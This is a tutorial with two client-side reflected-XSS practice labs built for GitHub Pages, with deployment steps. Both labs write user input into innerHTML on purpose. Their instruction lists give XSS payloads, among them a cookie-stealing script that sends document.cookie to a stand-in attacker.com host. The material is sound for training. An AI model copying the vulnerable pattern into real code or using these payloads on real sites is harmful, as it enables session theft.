




### Some limitations about these lab deployment on github pages

- Note that in the context of github pages, we can't execute php or any other back-end codes, so we should mimic their behaviour via single-page html structures like using JS or other solutions



#### Lab Sample-1 Notes

Below is a **Reflected XSS Lab** that features a large text input field centered on the page with a simple reflection mechanism. The design incorporates an **eye-catching front-end** with **rainbow colors** to make the lab visually engaging. This lab is built entirely with client-side technologies (HTML, CSS, and JavaScript) and can be hosted on GitHub Pages.

##### **Reflected XSS Lab: Single-Page HTML with Rainbow Colors**

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Reflected XSS Lab</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fad0c4, #a18cd1, #fbc2eb, #a6c0fe);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            background: rgba(255, 255, 255, 0.85);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 600px;
            width: 90%;
        }

        h1 {
            margin-bottom: 20px;
            color: #333;
            animation: colorChange 5s infinite;
        }

        @keyframes colorChange {
            0% { color: #ff0000; }
            25% { color: #ff7f00; }
            50% { color: #ffff00; }
            75% { color: #00ff00; }
            100% { color: #0000ff; }
        }

        textarea {
            width: 100%;
            height: 150px;
            padding: 10px;
            margin-bottom: 20px;
            border: 2px solid #ccc;
            border-radius: 8px;
            resize: none;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        textarea:focus {
            border-color: #007BFF;
            outline: none;
        }

        button {
            padding: 10px 20px;
            border: none;
            background-color: #007BFF;
            color: #fff;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #0056b3;
        }

        .output {
            margin-top: 20px;
            padding: 15px;
            border: 2px dashed #ccc;
            background-color: #f9f9f9;
            border-radius: 8px;
            min-height: 50px;
            word-wrap: break-word;
            animation: borderPulse 2s infinite;
        }

        @keyframes borderPulse {
            0% { border-color: #ff0000; }
            50% { border-color: #0000ff; }
            100% { border-color: #ff0000; }
        }

        .alert {
            color: #721c24;
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Reflected XSS Lab</h1>
        <form id="xssForm">
            <textarea id="payload" placeholder="Enter your XSS payload here..."></textarea><br>
            <button type="submit">Submit</button>
        </form>

        <div class="output" id="output"></div>

        <div class="instructions">
            <h2>Instructions</h2>
            <p>To test for reflected XSS, enter the following payloads into the input field:</p>
            <ul>
                <li><strong>Basic Alert:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                <li><strong>Image Payload:</strong> <code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></li>
                <li><strong>Event Handler:</strong> <code>&lt;input type="text" onfocus="alert('XSS')" autofocus&gt;</code></li>
                <li><strong>Stealing Cookies:</strong> <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code></li>
            </ul>
            <p><strong>Note:</strong> The payloads above are for demonstration purposes. Always ensure that you have permission to test for vulnerabilities on any system.</p>
        </div>
    </div>

    <script>
        // Get the form and output elements
        const form = document.getElementById('xssForm');
        const outputDiv = document.getElementById('output');
        const payloadInput = document.getElementById('payload');

        // Handle form submission
        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent page reload

            // Get the user input
            const payload = payloadInput.value;

            // Reflect the input in the output div
            // Note: This is where the XSS vulnerability is simulated
            outputDiv.innerHTML = `<h2>Hello, ${payload}!</h2>`;
        });
    </script>
</body>
</html>
```

##### **Explanation of the Code**

1. **HTML Structure:**
   - The page features a large `<textarea>` for user input and a `<div>` to display the reflected output.
   - The form is centered within a container that has a semi-transparent white background to contrast with the vibrant background.

2. **CSS Styling:**
   - **Background Gradient & Animation:**
     - The body uses a linear gradient with multiple colors and an animation to create a dynamic, eye-catching background.
   - **Container:**
     - The container has a semi-transparent white background with rounded corners and a subtle box shadow for depth.
   - **Typography & Colors:**
     - The heading (`h1`) changes color using a keyframe animation to add more visual interest.
     - The textarea and button are styled for better usability and aesthetics.
   - **Output Div:**
     - The output div has a dashed style border that pulses with color changes to draw attention.
   - **Animations:**
     - The background, heading, and output border all have animations to enhance the visual appeal.

3. **JavaScript Functionality:**
   - The script listens for the form submission event.
   - It prevents the default form submission behavior to avoid a page reload.
   - It retrieves the user input from the textarea and reflects it in the `output` div using `innerHTML`.
   - **Note:** Reflecting user input directly into `innerHTML` creates a reflected XSS vulnerability.

##### **Deploying to GitHub Pages**

1. **Create a GitHub Repository:**
   - Go to [GitHub](https://github.com/) and create a new repository (e.g., `xss-lab-rainbow`).

2. **Upload the `index.html` File:**
   - Clone the repository to your local machine:
     ```bash
     git clone https://github.com/YourGitHubUsername/xss-lab-rainbow.git
     ```
   - Navigate to the repository directory:
     ```bash
     cd xss-lab-rainbow
     ```
   - Create the `index.html` file with the above content and save it.
   - Add, commit, and push the changes:
     ```bash
     git add index.html
     git commit -m "Add Reflected XSS Lab with Rainbow Colors"
     git push origin main
     ```

3. **Enable GitHub Pages:**
   - Go to your repository on GitHub.
   - Click on the **"Settings"** tab.
   - Scroll down to the **"Pages"** section.
   - Under **"Source,"** select the branch (e.g., `main`) and click **"Save"**.
   - After a few minutes, your site will be live at `https://YourGitHubUsername.github.io/xss-lab-rainbow/`.

##### **Testing the Lab**

1. **Access the Lab:**
   - Open your web browser and navigate to `https://YourGitHubUsername.github.io/xss-lab-rainbow/`.

2. **Test the XSS Vulnerability:**
   - Enter the payloads provided in the instructions to see the XSS in action.
   - For example, entering `<script>alert('XSS')</script>` will trigger a JavaScript alert box.

##### **Security Considerations**

- **Controlled Environment:** Always run this lab in a controlled environment to prevent any potential security risks.
- **Educational Purposes Only:** This lab is designed for educational purposes to help understand XSS vulnerabilities and how they can be exploited.
- **No Malicious Use:** Do not use this lab to exploit vulnerabilities on systems you do not own or have permission to test.

##### **Conclusion**

This Reflected XSS Lab provides a visually engaging and interactive way to learn about XSS vulnerabilities. By using client-side technologies, it simulates the behavior of server-side reflected XSS and offers a platform for testing and understanding how such attacks work. Remember to use this lab responsibly and only in a controlled environment.



#### Lab Sample-2 Notes

Running a server-side PHP application directly on GitHub Pages isn't possible because GitHub Pages **only supports static content** (HTML, CSS, JavaScript, and other client-side technologies) and **does not support server-side languages** like PHP. However, you can simulate the behavior of the PHP-based Reflected XSS Lab using client-side technologies such as JavaScript. Below, I'll guide you through setting up a similar lab using only static files on GitHub Pages.

##### **Alternative Approach: Client-Side Reflected XSS Lab**

We'll create a single HTML file that mimics the behavior of the PHP lab by using JavaScript to handle form submissions and reflect user input. Here's how you can set it up:

###### **1. Create the HTML File**

Create a file named `index.html` with the following content:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Reflected XSS Lab</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px;
            background-color: #f0f0f0;
        }
        h1 {
            color: #333;
        }
        .container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        input[type="text"] {
            width: 300px;
            padding: 8px;
            margin-right: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        button {
            padding: 8px 16px;
            border: none;
            background-color: #007BFF;
            color: #fff;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .output {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #ccc;
            background-color: #f9f9f9;
            border-radius: 4px;
        }
        .alert {
            color: #721c24;
            background-color: #f8d7da;
            border: 1px solid #f5c6cb;
            padding: 10px;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Reflected XSS Lab</h1>
        <p>Enter your name to get a personalized greeting:</p>
        <form id="xssForm">
            <input type="text" id="name" name="name" placeholder="Enter your name">
            <button type="submit">Submit</button>
        </form>

        <div class="output" id="output"></div>

        <div class="instructions">
            <h2>Instructions</h2>
            <p>To test for reflected XSS, enter the following payloads into the input field:</p>
            <ul>
                <li><strong>Basic Alert:</strong> <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
                <li><strong>Image Payload:</strong> <code>&lt;img src="x" onerror="alert('XSS')"&gt;</code></li>
                <li><strong>Event Handler:</strong> <code>&lt;input type="text" onfocus="alert('XSS')" autofocus&gt;</code></li>
                <li><strong>Stealing Cookies:</strong> <code>&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</code></li>
            </ul>
            <p><strong>Note:</strong> The payloads above are for demonstration purposes. Always ensure that you have permission to test for vulnerabilities on any system.</p>
        </div>
    </div>

    <script>
        // Get the form and output elements
        const form = document.getElementById('xssForm');
        const outputDiv = document.getElementById('output');

        // Handle form submission
        form.addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent page reload

            // Get the user input
            const name = document.getElementById('name').value;

            // Reflect the input in the output div
            // Note: This is where the XSS vulnerability is simulated
            outputDiv.innerHTML = `<h2>Hello, ${name}!</h2>`;
        });
    </script>
</body>
</html>
```

###### **2. Understanding the Code**

- **HTML Structure:**
  - The structure is similar to the PHP version but uses a form with an `id` and a `div` with an `id` to handle the output.

- **JavaScript:**
  - The script listens for the form submission event.
  - It prevents the default form submission behavior to avoid a page reload.
  - It retrieves the user input and reflects it in the `output` div using `innerHTML`.
  - **Note:** Reflecting user input directly into `innerHTML` creates a reflected XSS vulnerability.

- **Instructions:**
  - The instructions section provides payloads to test the XSS vulnerability, just like in the PHP version.

###### **3. Deploying to GitHub Pages**

1. **Create a GitHub Repository:**
   - Go to [GitHub](https://github.com/) and create a new repository (e.g., `xss-lab`).

2. **Upload the `index.html` File:**
   - Clone the repository to your local machine:
     ```bash
     git clone https://github.com/YourGitHubUsername/xss-lab.git
     ```
   - Navigate to the repository directory:
     ```bash
     cd xss-lab
     ```
   - Create the `index.html` file with the above content and save it.
   - Add, commit, and push the changes:
     ```bash
     git add index.html
     git commit -m "Add Reflected XSS Lab"
     git push origin main
     ```

3. **Enable GitHub Pages:**
   - Go to your repository on GitHub.
   - Click on the **"Settings"** tab.
   - Scroll down to the **"Pages"** section.
   - Under **"Source,"** select the branch (e.g., `main`) and click **"Save"**.
   - After a few minutes, your site will be live at `https://YourGitHubUsername.github.io/xss-lab/`.

###### **4. Testing the Lab**

1. **Access the Lab:**
   - Open your web browser and navigate to `https://YourGitHubUsername.github.io/xss-lab/`.

2. **Test the XSS Vulnerability:**
   - Enter the payloads provided in the instructions to see the XSS in action.
   - For example, entering `<script>alert('XSS')</script>` will trigger a JavaScript alert box.

###### **5. Security Considerations**

- **Controlled Environment:** Always run this lab in a controlled environment to prevent any potential security risks.
- **Educational Purposes Only:** This lab is designed for educational purposes to help understand XSS vulnerabilities and how they can be exploited.
- **No Malicious Use:** Do not use this lab to exploit vulnerabilities on systems you do not own or have permission to test.

##### **Conclusion**

While GitHub Pages doesn't support server-side languages like PHP, you can still create an effective Reflected XSS Lab using client-side technologies such as JavaScript. This approach allows you to simulate the behavior of server-side reflected XSS and provides a platform for testing and learning about XSS vulnerabilities in a safe and controlled manner.